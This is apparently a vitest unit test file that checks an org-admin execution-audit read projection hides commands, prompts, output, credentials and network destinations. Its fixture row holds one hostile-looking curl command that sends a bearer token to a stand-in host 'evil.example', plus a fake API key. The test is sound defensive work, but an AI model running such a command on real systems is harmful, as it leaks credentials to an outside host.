// Unit tests for the org-admin execution-audit READ projection (exec-plane S1b
// activation, cinatra#2138 deliverable 3).
//
// The issue's constraint is that these rows carry EVENT METADATA ONLY: no
// prompt text, no executed code, no credentials, no full network destinations.
// The projection is an explicit allowlist, so this test feeds it a deliberately
// hostile metadata blob (one carrying every forbidden shape) and asserts none of
// it can reach the surface.

import { beforeEach, describe, expect, it, vi } from "vitest";

const queries: Array<{ text: string; values?: unknown[] }> = [];
let rows: Array<Record<string, unknown>> = [];
let throwOnQuery = false;

vi.mock("@/lib/postgres-config", () => ({
  getPostgresConnectionString: () => "postgres://test",
  postgresSchema: "cinatra",
}));
vi.mock("@/lib/postgres-schema-init", () => ({ ensurePostgresSchema: () => {} }));
vi.mock("@/lib/postgres-sync", () => ({
  runPostgresQueriesSync: (input: { queries: Array<{ text: string; values?: unknown[] }> }) => {
    if (throwOnQuery) throw new Error("database unavailable");
    queries.push(...input.queries);
    return [{ rows, rowCount: rows.length }];
  },
}));

import {
  EXECUTION_AUDIT_OPERATION,
  EXECUTION_AUDIT_RESOURCE_TYPE,
  readExecutionAuditRows,
} from "@/lib/execution/execution-audit-read";

const HOSTILE_ROW = {
  id: "evt-1",
  organization_id: "org-1",
  actor_principal_id: "user-1",
  resource_id: "job-1",
  run_id: "run-1",
  decision: "allowed",
  created_at: new Date("2026-07-27T10:11:12.000Z"),
  metadata: {
    // Legitimate metadata the projection DOES surface.
    surface: "agent_run",
    exitCode: 0,
    termination: "exited",
    imageDigest: "sha256:abcdef",
    egressMode: "allowlist",
    egressTotalBytes: 1234,
    wallMs: 900,
    reason: null,
    // Everything below must NEVER reach the surface.
    command: "curl https://evil.example -H 'authorization: Bearer sk-live-1'",
    prompt: "the user's private prompt",
    stdout: "secret output",
    stderr: "secret output",
    credential: "sk-live-1",
    egressDestinations: [{ host: "evil.example", port: 443, allowed: false }],
  },
};

beforeEach(() => {
  queries.length = 0;
  rows = [];
  throwOnQuery = false;
});

describe("execution audit read projection", () => {
  it("surfaces ONLY event metadata — never command, prompt, output, credential or destinations", () => {
    rows = [HOSTILE_ROW];
    const [row] = readExecutionAuditRows({ orgId: "org-1" });
    expect(row).toEqual({
      id: "evt-1",
      jobId: "job-1",
      orgId: "org-1",
      actorId: "user-1",
      surface: "agent_run",
      runId: "run-1",
      decision: "allowed",
      reason: null,
      exitCode: 0,
      termination: "exited",
      imageDigest: "sha256:abcdef",
      egressMode: "allowlist",
      egressTotalBytes: 1234,
      wallMs: 900,
      createdAt: "2026-07-27T10:11:12.000Z",
    });
    const serialized = JSON.stringify(row);
    for (const forbidden of [
      "curl",
      "evil.example",
      "sk-live-1",
      "secret output",
      "private prompt",
    ]) {
      expect(serialized).not.toContain(forbidden);
    }
  });

  it("scopes to the execution resource + operation, and to the org when given", () => {
    readExecutionAuditRows({ orgId: "org-7", limit: 5 });
    const [query] = queries;
    expect(query.values?.[0]).toBe(EXECUTION_AUDIT_RESOURCE_TYPE);
    expect(query.values?.[1]).toBe(EXECUTION_AUDIT_OPERATION);
    expect(query.values?.[2]).toBe("org-7");
    expect(query.values?.[3]).toBe(5);
    expect(query.text).toContain("organization_id = $3");
  });

  it("omits the org predicate for an instance-wide read", () => {
    readExecutionAuditRows({ orgId: null });
    expect(queries[0].text).not.toContain("organization_id =");
  });

  it("clamps the limit into a sane range", () => {
    readExecutionAuditRows({ limit: 100_000 });
    expect(queries[0].values?.at(-1)).toBe(200);
    queries.length = 0;
    readExecutionAuditRows({ limit: 0 });
    expect(queries[0].values?.at(-1)).toBe(1);
  });

  it("degrades to an empty list rather than throwing when the store is down", () => {
    throwOnQuery = true;
    expect(readExecutionAuditRows()).toEqual([]);
  });
});
